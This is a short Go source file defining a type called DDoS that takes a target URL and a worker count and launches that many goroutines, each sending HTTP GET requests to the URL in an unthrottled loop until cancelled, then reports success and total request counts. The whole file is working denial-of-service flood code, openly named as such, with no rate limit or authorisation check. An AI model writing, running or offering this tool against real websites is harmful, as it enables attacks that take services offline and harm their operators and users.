package system

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"sync/atomic"
)

type DDoS struct {
	url           string
	amountWorkers int
	http          http.Client

	successRequests atomic.Int64
	amountRequests  atomic.Int64
}

func (s *System) NewDDoS(URL string, workers int) (*DDoS, error) {
	if workers < 1 {
		return nil, fmt.Errorf("Amount of workers cannot be less 1")
	}

	u, err := url.Parse(URL)
	if err != nil || len(u.Host) == 0 {
		return nil, fmt.Errorf("Undefined host or error = %v", err)
	}

	return &DDoS{
		url:           URL,
		http:          http.Client{},
		amountWorkers: workers,
	}, nil
}

func (d *DDoS) Run(ctx context.Context) {
	for range d.amountWorkers {
		go d.worker(ctx)
	}
}

func (d *DDoS) worker(ctx context.Context) {
	for {
		select {
		case <-ctx.Done():
			return
		default:
			resp, err := d.http.Get(d.url)
			d.amountRequests.Add(1)
			if err == nil {
				d.successRequests.Add(1)
				_, _ = io.Copy(io.Discard, resp.Body)
				_ = resp.Body.Close()
			}
		}
	}
}

func (d *DDoS) Result(ctx context.Context) (successRequests, amountRequests int64) {
	<-ctx.Done()
	return d.successRequests.Load(), d.amountRequests.Load()
}
